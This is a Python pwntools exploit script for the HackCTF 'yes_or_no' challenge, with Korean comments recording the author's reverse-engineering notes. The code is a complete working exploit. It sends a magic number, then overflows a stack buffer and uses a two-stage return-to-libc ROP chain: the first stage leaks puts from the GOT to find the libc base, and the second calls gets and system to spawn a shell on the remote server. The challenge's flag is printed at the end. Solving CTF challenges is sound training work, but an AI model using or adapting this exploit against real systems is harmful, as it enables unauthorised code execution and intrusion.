# -*- coding: utf-8 -*-
from pwn import * 
# 일련의 계산을 거친 후, eax에 들어있는 0x960000(9830400)과 아까 입력한숫자를 같은지 비교한다. 
# 점프 이후엔, 아까 3이 더해졌던 rbp-4의 값과 rbp-0x12위치의 값이 같은지 비교한다. 
# 만약에 9830400을 입력한다면, 동일 위치에 입력을 한번더 받을 수 있게 된다. 
# 8을 입력한다면 , 그냥 프로그램이 끝난다. 
# 즉, 9830400 입력한 이후에 오버플로우를 일으켜 흐름을 조작시켜야 되는듯. 

# 여기서, 문제에서 힌트를 주고있다. do_system+1094 위치를 언급하는데 
# 해당 함수는 내부적으로 execve를 호출하는 특성이 있다. 
# 해당 주소는 고정주소가 아니기 때문에 직접적인 점프는 힘들다. 

# 아까 rbp-4의 값을 시프트해서 비교하는 구문으로 점프를 뛰게 해볼까?
# rip 주소 0x7fffffffe3a8, 입력받는 주소 0x7fffffffe38e 이므로 총26바이트 + 주소값. 
# 디버깅을 해보니, 18바이트 + 8 바이트 식으로 입력을 했을 때 
# main함수 종료 후 마지막 8바이트 입력값 주소를 call해주는게 보인다. 
# rtl를 하란 얘기같다. pie는 꺼져있고 relro 는 partial
# puts 로 주소 leak 한다음에 system 함수 주소 가져오는 식으로 해야될거같다. 


#p = process(["./yes_or_no"],env={'LD_PRELOAD':'./libc.so.6'})
libc = ELF("./libc.so.6")
#p = process("./yes_or_no")
p = remote("ctf.j0n9hyun.xyz",3009)

puts_plt = 0x400580
puts_got = 0x601018
gets_plt = 0x4005b0

popret = 0x400648
poprdi = 0x400883

#puts_offset = 0x809C0				#local
puts_offset = libc.symbols["puts"]
#system_offset = 0x4F440			#local
system_offset = libc.symbols["system"] 
#binsh_offset = 0x1B3E9A

#do_offset = 0x4F2F6				#local
do_offset = 0x45269		#remote
bss = 0x601080

main = 0x04006c7

p.recvuntil("Show")
p.sendlineafter("number~!","9830400")

# 64비트 RTL 문제 
# 0x7ffe3cf93bfe 부터 입력들어감, 0x7ffe3cf93c18 eip 위치 ,크기 1A(26바이트)
# 26바이트 삽입 후 puts_p + pr + gets_p /  gets_p + pr + bss / system + pr + bss 
# gets 의 주소값 leak 해서 오프셋 계산, libc leak 하고 시스템 offset 더해서 계산.
# 아, binsh 입력해줄 필요가 없었다. libc에 박혀있다.
# 그러면, leak을 한번 하고 다시 메인함수로 돌아가서 두번쨰 rtl을 하게 만들자. 
# 64비트 rtl이다. 인자를 레지스터로, rdi -> rsi -> rdx -> rcx 

payload = "a"*0x1a
payload += p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(main)  #1. leak stage

p.sendlineafter("me",payload)
print p.recvline()

recv = p.recv().strip()
leak = u64(recv+"\x00"*(8-len(recv)))
libc = leak - puts_offset

log.info(hex(leak))

do = libc+do_offset
system = libc+system_offset

log.info("libc : "+hex(libc))
log.info("do_offset : "+hex(do_offset))

p.sendline("9830400")

payload2 = "b"*0x1a
#payload2 += p64(poprdi) + p64(binsh) + p64(system)  #2. call system(/bin/sh)

#왜인지는 모르겠는데 system("bin/sh/)실행이 안된다. 흠.. 그럼 문제에서 힌트 준대로 풀어보자. 

#payload2 += p64(do)
# do_system+1094 로 가니까 풀이 완료. 근데 리모트에서 이대로 하니까 또 안된다. 그냥 rtl로 다시가자 
# 그러면 된다. 휴.

payload2 += p64(poprdi) + p64(bss) + p64(gets_plt)  
payload2 += p64(poprdi) + p64(bss) + p64(system) #2. call system(/bin/sh)

p.recvline()

pause()
p.sendline(payload2)
p.sendline("/bin/sh\00")

p.interactive()

#HackCTF{4nd_4_P4ssing_necklace_in_h1s_h4nd}